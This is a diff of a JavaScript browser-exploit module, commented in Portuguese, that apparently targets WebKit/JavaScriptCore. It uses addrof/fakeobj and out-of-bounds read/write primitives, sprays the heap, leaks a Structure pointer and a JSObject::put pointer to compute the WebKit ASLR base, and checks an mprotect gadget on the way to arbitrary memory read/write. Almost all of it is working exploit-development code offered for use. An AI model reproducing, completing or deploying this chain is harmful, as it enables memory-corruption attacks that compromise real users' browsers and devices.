@@ -1,7 +1,11 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v160 - Estabilizando oob_array_buffer_real)
+// js/script3/testArrayBufferVictimCrash.mjs (v161 - Estratégia: Vazamento ASLR Direto, OOB Persistente)
 // =======================================================================================
-// FOCO: Garantir que o ArrayBuffer de apoio da primitiva OOB (oob_array_buffer_real)
-// permaneça válido e não corrompido, resolvendo o m_vector zerado na arb_read.
+// ESTA VERSÃO FOCA EM:
+// 1. Manter o ambiente OOB persistente entre o selfTest e a exploração principal.
+// 2. Usar 'addrof_core' e 'oob_read_absolute' para vazar o ponteiro da Structure de um objeto ArrayBuffer.
+// 3. Com o ponteiro da Structure, calcular a base ASLR da WebKit.
+// 4. Se o vazamento ASLR for bem-sucedido, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
+// 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
 // =======================================================================================
 
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -12,19 +16,17 @@ import {
     addrof_core,
     fakeobj_core,
     initCoreAddrofFakeobjPrimitives,
-    arb_read, // Usado para operações internas da OOB principal (leitura/escrita de metadados)
-    arb_write, // Usado para operações internas da OOB principal (leitura/escrita de metadados)
-    selfTestOOBReadWrite,
+    arb_read,
+    arb_write,
+    selfTestOOBReadWrite, // Vai manter o ambiente OOB persistente agora
     oob_read_absolute,
-    oob_write_absolute,
-    oob_array_buffer_real, // Importado para verificar o backing store original
-    oob_dataview_real // Importado para ver o DataView diretamente
+    oob_write_absolute
 } from '../core_exploit.mjs';
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // ATENÇÃO: Esta constante será atualizada a cada nova versão de teste
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_ASLR_ARBRW_v160_DEBUG_OOB_STABILITY";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_ASLR_ARBRW_v161_PERSISTENT_OOB";
 
 // Pausas ajustadas para estabilidade em ambientes com recursos limitados
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -271,13 +273,14 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
 
         logFn("--- FASE 0: Validando primitivas arb_read/arb_write (OLD PRIMITIVE) com selfTestOOBReadWrite ---", "subtest");
+        // selfTestOOBReadWrite() AGORA MANTÉM O AMBIENTE OOB PERSISTENTE
         const arbTestSuccess = await selfTestOOBReadWrite(logFn);
         if (!arbTestSuccess) {
             const errMsg = "Falha crítica: As primitivas arb_read/arb_write (OLD PRIMITIVE) não estão funcionando. Abortando a exploração.";
             logFn(errMsg, "critical");
             throw new Error(errMsg);
         }
-        logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Prosseguindo com a exploração.", "good");
+        logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Ambiente OOB PRONTO E PERSISTENTE. Prosseguindo com a exploração.", "good");
         await pauseFn(LOCAL_MEDIUM_PAUSE);
 
         logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos OTIMIZADO) ---", "subtest");
@@ -294,21 +297,15 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
         const oobSetupStartTime = performance.now();
-        logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
-        await triggerOOB_primitive({ force_reinit: true });
+        // NÂO precisa chamar triggerOOB_primitive() aqui novamente, pois selfTest já o fez e ele persiste
+        // if (!oob_dataview_real || !oob_array_buffer_real || !isOOBReady()) { // Adicionar verificação defensiva
+        //     logFn(`ALERTA: Ambiente OOB não persistiu como esperado. Forçando re-inicialização.`, "warn");
+        //     await triggerOOB_primitive({ force_reinit: true });
+        // }
 
-        // AQUI ESTÁ A MUDANÇA CRUCIAL:
-        // Garantir que o oob_array_buffer_real seja adicionado ao hold_objects
-        // logo após sua criação em triggerOOB_primitive.
-        // Isso é feito em core_exploit.mjs, mas uma verificação aqui é boa.
-        // IMPORTANTE: o 'oob_array_buffer_real' é uma variável exportada do core_exploit.
-        // Não é criado diretamente aqui, mas sim obtido por getOOBDataView().
-        // A proteção contra GC deve estar no core_exploit.mjs.
-        // NO core_exploit.mjs, precisamos adicionar o 'oob_array_buffer_real' a uma lista de hold_objects INTERNA.
-
-        const oob_data_view = getOOBDataView();
+        const oob_data_view = getOOBDataView(); // Obter a referência ao DataView persistente
         if (!oob_data_view) {
-            const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
+            const errMsg = "Falha crítica ao obter primitiva OOB persistente. DataView é nulo.";
             logFn(errMsg, "critical");
             throw new Error(errMsg);
         }
@@ -322,16 +319,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         // --- NOVA FASE 2.5: Vazamento ASLR Direto via Leitura do Structure Pointer de ArrayBuffer ---
         logFn(`--- NOVA FASE 2.5: Vazamento ASLR Direto via Leitura do Structure Pointer de ArrayBuffer ---`, "subtest");
         
-        // Criar um ArrayBuffer para vazar seu endereço e sua Structure
         let array_buffer_for_leak = new ArrayBuffer(0x100); 
-        hold_objects.push(array_buffer_for_leak); // Garante que o objeto não seja coletado
+        hold_objects.push(array_buffer_for_leak);
         
         const ab_addr = addrof_core(array_buffer_for_leak);
         logFn(`[ASLR LEAK] Endereço do ArrayBuffer alvo: ${ab_addr.toString(true)}`, "info");
 
         // VALIDAR A `arb_read` EM AÇÃO AQUI:
-        // Lendo um valor conhecido para ter certeza que `arb_read` está funcionando neste ponto.
-        // Vamos ler o m_length do próprio ArrayBuffer para leak, ele deve ser 0x100 (256 bytes)
         const m_length_offset = JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START;
         const m_length_addr = ab_addr.add(m_length_offset);
         logFn(`[ASLR LEAK] DEBUG: Verificando arb_read lendo m_length em ${m_length_addr.toString(true)}...`, "debug");
@@ -361,11 +355,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             logFn(`[ASLR LEAK] Ponteiro da Structure vazado: ${structure_pointer_leaked.toString(true)}. HIGH inesperado (0x${original_high_leaked_struct_ptr.toString(16)}). NENHUM untagging aplicado.`, "warn");
         }
 
-        // AGORA CALCULAMOS A BASE ASLR USANDO O PONTEIRO PARA JSObject::put VAZADO DA STRUCTURE
-        // A Structure que vazamos aponta para a implementação do método 'put'
-        // no offset JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET.
-        // 'JSC::JSObject::put' tem um offset conhecido na libWebkit.
-
         const JSObject_put_ptr_offset_in_structure = JSC_OFFSETS_PARAM.Structure.VIRTUAL_PUT_OFFSET;
         const JSObject_put_ptr_address_in_heap = structure_pointer_leaked.add(JSObject_put_ptr_offset_in_structure);
         
@@ -373,7 +362,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const JSObject_put_leaked = await arb_read_universal_js_heap(JSObject_put_ptr_address_in_heap, 8, logFn);
         logFn(`[ASLR LEAK] Ponteiro para JSObject::put vazado: ${JSObject_put_leaked.toString(true)}`, "leak");
 
-        // Se JSObject_put_leaked é zero, algo deu muito errado ou o offset está incorreto.
         if (JSObject_put_leaked.equals(AdvancedInt64.Zero) || JSObject_put_leaked.equals(AdvancedInt64.NaNValue)) {
             throw new Error(`Ponteiro vazado para JSObject::put é inválido (Zero/NaN): ${JSObject_put_leaked.toString(true)}. Vazamento ASLR falhou.`);
         }
@@ -381,13 +369,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const JSObject_put_offset_in_lib = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"], 16), 0);
         webkit_base_address = JSObject_put_leaked.sub(JSObject_put_offset_in_lib);
 
-        // Verificação da validade da base WebKit
         if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
             throw new Error(`Base WebKit calculada é inválida ou não alinhada: ${webkit_base_address.toString(true)}. Vazamento de ASLR falhou.`);
         }
         logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO VIA LEAK DIRETO: ${webkit_base_address.toString(true)}`, "good");
         
-        // Fazer um pequeno dump para confirmar que a base WebKit está correta (lendo um gadget conhecido)
         const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
         const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
         logFn(`[ASLR LEAK] Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
